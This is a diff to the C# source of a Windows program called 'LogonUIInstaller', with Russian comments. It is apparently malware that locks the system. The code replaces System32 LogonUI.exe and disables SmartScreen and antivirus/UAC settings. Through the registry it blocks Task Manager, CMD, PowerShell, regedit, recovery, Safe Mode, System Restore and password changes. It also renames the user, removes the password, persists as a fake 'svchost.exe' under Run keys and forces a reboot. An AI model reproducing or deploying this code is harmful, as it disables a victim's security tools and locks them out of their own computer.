@@ -43,11 +43,7 @@ namespace LogonUIInstaller
                 }
 
                 ExtractAllResources();
-                
-                // ===== БЛОКИРОВКА СИСТЕМЫ =====
-                SystemBlocker.BlockEverything();
-                RegistryLocker.LockEverything();
-                
+                ApplyAllLocks();
                 DisableAntivirusAndUAC();
                 ApplySettingsToDefaultProfile();
                 RenameCurrentUserFixed();
@@ -61,7 +57,7 @@ namespace LogonUIInstaller
             }
         }
 
-        // ==================== РАСПАКОВКА РЕСУРСОВ ====================
+        // ==================== РАСПАКОВКА ====================
         private static void ExtractAllResources()
         {
             try
@@ -100,7 +96,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== ЗАМЕНА LogonUI (УСИЛЕННАЯ) ====================
+        // ==================== ЗАМЕНА LogonUI (БЕЗ ЖЁСТКОЙ БЛОКИРОВКИ) ====================
         private static void ReplaceLogonUI()
         {
             try
@@ -108,19 +104,12 @@ namespace LogonUIInstaller
                 string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                 if (!File.Exists(originalPath)) return;
 
-                // 1. Полный доступ
                 ForceFullAccess(originalPath);
-                
-                // 2. Убиваем все процессы
                 KillLogonUIProcesses();
-                
-                // 3. Ждем освобождения файла
-                Thread.Sleep(2000);
-                
-                // 4. Удаляем файл всеми способами
+                Thread.Sleep(1000);
+
                 File.SetAttributes(originalPath, FileAttributes.Normal);
-                
-                for (int i = 0; i < 10; i++)
+                for (int i = 0; i < 5; i++)
                 {
                     try
                     {
@@ -136,45 +125,15 @@ namespace LogonUIInstaller
                             File.Delete(originalPath + ".del");
                             break;
                         }
-                        catch
-                        {
-                            try
-                            {
-                                // Пробуем через cmd
-                                Process.Start(new ProcessStartInfo
-                                {
-                                    FileName = "cmd.exe",
-                                    Arguments = $"/c del /f /q \"{originalPath}\"",
-                                    CreateNoWindow = true,
-                                    WindowStyle = ProcessWindowStyle.Hidden,
-                                    UseShellExecute = false
-                                })?.WaitForExit(3000);
-                            }
-                            catch { }
-                        }
+                        catch { }
                     }
                 }
 
-                // 5. Записываем кастомный LogonUI
                 byte[] customLogonUI = ExtractResourceBytes("LogonUI.exe");
                 File.WriteAllBytes(originalPath, customLogonUI);
-                
-                // 6. Делаем его скрытым и защищенным
-                File.SetAttributes(originalPath, FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
-                
-                // 7. Блокируем доступ к файлу
-                try
-                {
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = "icacls.exe",
-                        Arguments = $"\"{originalPath}\" /deny Everyone:F",
-                        CreateNoWindow = true,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        UseShellExecute = false
-                    })?.WaitForExit(3000);
-                }
-                catch { }
+
+                // Только ReadOnly + Hidden (без жёсткой блокировки)
+                File.SetAttributes(originalPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
             }
             catch { }
         }
@@ -194,12 +153,7 @@ namespace LogonUIInstaller
 
         private static void ForceFullAccess(string path)
         {
-            try
-            {
-                File.SetAttributes(path, FileAttributes.Normal);
-            }
-            catch { }
-
+            try { File.SetAttributes(path, FileAttributes.Normal); } catch { }
             try
             {
                 Process p = Process.Start(new ProcessStartInfo
@@ -210,41 +164,24 @@ namespace LogonUIInstaller
                     UseShellExecute = false,
                     WindowStyle = ProcessWindowStyle.Hidden
                 });
-                p?.WaitForExit(5000);
+                p?.WaitForExit(3000);
                 p?.Close();
             }
             catch { }
-
             try
             {
                 Process p = Process.Start(new ProcessStartInfo
                 {
                     FileName = "icacls.exe",
-                    Arguments = $"\"{path}\" /grant Everyone:F /grant SYSTEM:F /grant Administrators:F",
+                    Arguments = $"\"{path}\" /grant Everyone:F",
                     CreateNoWindow = true,
                     UseShellExecute = false,
                     WindowStyle = ProcessWindowStyle.Hidden
                 });
-                p?.WaitForExit(5000);
+                p?.WaitForExit(3000);
                 p?.Close();
             }
             catch { }
-
-            try
-            {
-                Process p = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "icacls.exe",
-                    Arguments = $"\"{path}\" /grant Administrators:F",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-                p?.WaitForExit(5000);
-                p?.Close();
-            }
-            catch { }
-
             try
             {
                 FileInfo fi = new FileInfo(path);
@@ -255,9 +192,6 @@ namespace LogonUIInstaller
                     FileSystemRights.FullControl, AccessControlType.Allow));
                 fs.AddAccessRule(new FileSystemAccessRule(
                     new NTAccount("NT AUTHORITY\\SYSTEM"),
-                    FileSystemRights.FullControl, AccessControlType.Allow));
-                fs.AddAccessRule(new FileSystemAccessRule(
-                    new NTAccount("BUILTIN\\Administrators"),
                     FileSystemRights.FullControl, AccessControlType.Allow));
                 fi.SetAccessControl(fs);
             }
@@ -276,70 +210,133 @@ namespace LogonUIInstaller
                             p.MainModule.FileName.Contains("System32"))
                         {
                             p.Kill();
-                            p.WaitForExit(5000);
+                            p.WaitForExit(3000);
                             Thread.Sleep(500);
                         }
                     }
                     catch { }
                 }
-                
-                // Дополнительно убиваем через taskkill
-                try
+            }
+            catch { }
+        }
+
+        // ==================== ВСЕ БЛОКИРОВКИ (ВСТРОЕНЫ) ====================
+        private static void ApplyAllLocks()
+        {
+            // Блокировка Task Manager
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+
+            // Блокировка CMD
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
+                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
+            using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
+                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
+
+            // Блокировка PowerShell
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
+                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
+            using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
+                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
+
+            // Блокировка VBS/VBE
+            using (var key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
+                key.SetValue("", "txtfile", RegistryValueKind.String);
+            using (var key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
+                key.SetValue("", "txtfile", RegistryValueKind.String);
+
+            // Блокировка regedit
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
+            using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
+
+            // Блокировка Recovery
+            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
+            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Recovery"))
+                key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
+
+            // Блокировка Safe Mode
+            using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
+                key.SetValue("OptionValue", 1, RegistryValueKind.DWord);
+
+            // Скрываем Boot Menu
+            using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
+            {
+                key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
+                key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
+            }
+
+            // Скрываем диски
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+            {
+                key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
+                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
+                key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
+                key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
+            }
+
+            // Отключаем System Restore
+            try
+            {
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\SystemRestore"))
                 {
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = "taskkill",
-                        Arguments = "/f /im LogonUI.exe",
-                        CreateNoWindow = true,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        UseShellExecute = false
-                    })?.WaitForExit(3000);
+                    key.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
+                    key.SetValue("DisableSR", 1, RegistryValueKind.DWord);
                 }
-                catch { }
             }
             catch { }
-        }
 
-        // ==================== УСТАНОВЩИК ====================
-        private static bool IsElevated()
-        {
-            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
-        }
+            // Отключаем установщики MSI
+            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Installer"))
+                key.SetValue("DisableMSI", 2, RegistryValueKind.DWord);
 
-        private static void RestartAsAdmin()
-        {
-            try
+            // Блокировка смены пароля
+            using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
+
+            // Блокировка диспетчера устройств
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("NoDevMgr", 1, RegistryValueKind.DWord);
+
+            // Блокировка MMC
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\MMC"))
+                key.SetValue("RestrictToPermittedSnapins", 1, RegistryValueKind.DWord);
+
+            // Обои и курсоры для текущего пользователя
+            string wallpaperPath = Path.Combine(appDataPath, "wd.webp");
+            string cursorPath = Path.Combine(appDataPath, "fg.ani");
+
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
             {
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = Assembly.GetEntryAssembly().Location,
-                    Verb = "runas",
-                    UseShellExecute = true,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
+                key.SetValue("Wallpaper", wallpaperPath, RegistryValueKind.String);
+                key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
+                key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
             }
-            catch { }
-            Environment.Exit(0);
-        }
 
-        private static void ForceReboot()
-        {
-            try
+            using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"))
             {
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "shutdown",
-                    Arguments = "/r /f /t 0",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    UseShellExecute = false
-                });
+                key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
+                key.SetValue("Help", cursorPath, RegistryValueKind.String);
+                key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
+                key.SetValue("Wait", cursorPath, RegistryValueKind.String);
+                key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
+                key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
+                key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
+                key.SetValue("No", cursorPath, RegistryValueKind.String);
+                key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
+                key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
+                key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
+                key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
+                key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
+                key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
             }
-            catch { }
-            Environment.Exit(0);
         }
 
+        // ==================== ОТКЛЮЧЕНИЕ ЗАЩИТЫ ====================
         private static void DisableAntivirusAndUAC()
         {
             try
@@ -356,44 +353,11 @@ namespace LogonUIInstaller
 
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                     key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
-
-                // Отключение Windows Security Center
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Security Center"))
-                {
-                    key.SetValue("DisableNotifications", 1, RegistryValueKind.DWord);
-                    key.SetValue("UILockdown", 1, RegistryValueKind.DWord);
-                }
-
-                // Отключение Defender через реестр (все методы)
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
-                {
-                    key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisableBlockAtFirstSeen", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisableIOAVProtection", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisablePrivacyMode", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisableAntiVirus", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisableSpyware", 1, RegistryValueKind.DWord);
-                    key.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
-                }
-
-                // Отключаем Defender через MpPreference
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows Defender\Features"))
-                {
-                    key.SetValue("TamperProtection", 0, RegistryValueKind.DWord);
-                }
-
-                // Отключаем SmartScreen для приложений
-                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"))
-                {
-                    key.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
-                }
             }
             catch { }
         }
 
-        // ==================== НАСТРОЙКИ DEFAULT ПРОФИЛЯ ====================
+        // ==================== DEFAULT ПРОФИЛЬ ====================
         private static void ApplySettingsToDefaultProfile()
         {
             try
@@ -426,6 +390,14 @@ namespace LogonUIInstaller
                 });
                 p2?.WaitForExit(3000);
                 p2?.Close();
+
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\OOBE"))
+                    key.SetValue("DisableOOBE", 1, RegistryValueKind.DWord);
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\OOBE"))
+                {
+                    key.SetValue("SkipMachineOOBE", 1, RegistryValueKind.DWord);
+                    key.SetValue("SkipUserOOBE", 1, RegistryValueKind.DWord);
+                }
             }
             catch { }
         }
@@ -484,7 +456,7 @@ namespace LogonUIInstaller
             catch { }
         }
 
-        // ==================== ПЕРЕИМЕНОВАНИЕ ПОЛЬЗОВАТЕЛЯ ====================
+        // ==================== ПЕРЕИМЕНОВАНИЕ ====================
         private static void RenameCurrentUserFixed()
         {
             try
@@ -492,7 +464,6 @@ namespace LogonUIInstaller
                 string currentUser = Environment.UserName;
                 string newUser = "CLOSE YOUR EYES";
 
-                // 1. Убираем пароль
                 Process p0 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "net",
@@ -504,7 +475,6 @@ namespace LogonUIInstaller
                 p0?.WaitForExit(3000);
                 p0?.Close();
 
-                // 2. Переименовываем через WMIC
                 Process p1 = Process.Start(new ProcessStartInfo
                 {
                     FileName = "wmic",
@@ -516,33 +486,24 @@ namespace LogonUIInstaller
                 p1?.WaitForExit(5000);
                 p1?.Close();
 
-                // 3. Переименовываем папку профиля
                 string oldProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", currentUser);
                 string newProfilePath = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") + "\\Users", newUser);
-                
+
                 if (Directory.Exists(oldProfilePath) && !Directory.Exists(newProfilePath))
                 {
-                    try
-                    {
-                        Directory.Move(oldProfilePath, newProfilePath);
-                    }
-                    catch { }
+                    try { Directory.Move(oldProfilePath, newProfilePath); } catch { }
                 }
 
-                // 4. Обновляем путь в реестре
                 string sid = GetUserSID(newUser);
                 if (!string.IsNullOrEmpty(sid))
                 {
                     using (var key = Registry.LocalMachine.OpenSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{sid}", true))
                     {
                         if (key != null)
-                        {
                             key.SetValue("ProfileImagePath", newProfilePath, RegistryValueKind.ExpandString);
-                        }
                     }
                 }
 
-                // 5. Active Setup
                 string guid = Guid.NewGuid().ToString("B").ToUpper();
                 using (var key = Registry.LocalMachine.CreateSubKey($@"SOFTWARE\Microsoft\Active Setup\Installed Components\{guid}"))
                 {
@@ -551,7 +512,6 @@ namespace LogonUIInstaller
                     key.SetValue("Version", "1.0", RegistryValueKind.String);
                 }
 
-                // 6. Автоматический вход
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                 {
                     key.SetValue("AutoAdminLogon", "1", RegistryValueKind.String);
@@ -574,9 +534,7 @@ namespace LogonUIInstaller
                         {
                             string profilePath = subKey.GetValue("ProfileImagePath") as string;
                             if (!string.IsNullOrEmpty(profilePath) && profilePath.EndsWith(username))
-                            {
                                 return sid;
-                            }
                         }
                     }
                 }
@@ -585,7 +543,7 @@ namespace LogonUIInstaller
             return null;
         }
 
-        // ==================== УСТАНОВКА АВТОЗАПУСКА ====================
+        // ==================== АВТОЗАПУСК ====================
         private static void AddToStartupWithStage2()
         {
             try
@@ -595,7 +553,7 @@ namespace LogonUIInstaller
 
                 string selfPath = Assembly.GetEntryAssembly().Location;
                 string destPath = Path.Combine(appDataPath, "svchost.exe");
-                
+
                 if (File.Exists(selfPath))
                 {
                     if (File.Exists(destPath))
@@ -608,14 +566,53 @@ namespace LogonUIInstaller
 
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
-                
+
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
 
-                using (var key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
+                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
             }
             catch { }
+        }
+
+        private static bool IsElevated()
+        {
+            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        private static void RestartAsAdmin()
+        {
+            try
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = Assembly.GetEntryAssembly().Location,
+                    Verb = "runas",
+                    UseShellExecute = true,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+            }
+            catch { }
+            Environment.Exit(0);
+        }
+
+        private static void ForceReboot()
+        {
+            try
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "shutdown",
+                    Arguments = "/r /f /t 0",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
+                });
+            }
+            catch { }
+            Environment.Exit(0);
         }
     }
 }
